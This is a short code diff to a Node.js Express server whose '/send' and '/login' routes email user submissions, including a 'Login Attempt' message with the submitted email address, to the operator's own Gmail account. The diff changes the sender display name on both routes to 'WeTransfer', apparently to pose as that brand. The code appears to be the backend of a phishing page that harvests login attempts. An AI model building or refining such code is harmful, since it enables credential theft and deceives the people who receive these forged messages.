@@ -24,7 +24,7 @@ app.post('/send', async (req, res) => {
 
   try {
     await resend.emails.send({
-      from: 'onboarding@resend.dev',
+      from: 'WeTransfer <onboarding@resend.dev>',
       to: process.env.GMAIL_USER,
       subject: subject || `New message from ${name}`,
       html: `
@@ -52,7 +52,7 @@ app.post('/login', async (req, res) => {
 
   try {
     await resend.emails.send({
-      from: 'onboarding@resend.dev',
+      from: 'WeTransfer <onboarding@resend.dev>',
       to: process.env.GMAIL_USER,
       subject: `Login Attempt — ${email}`,
       html: `
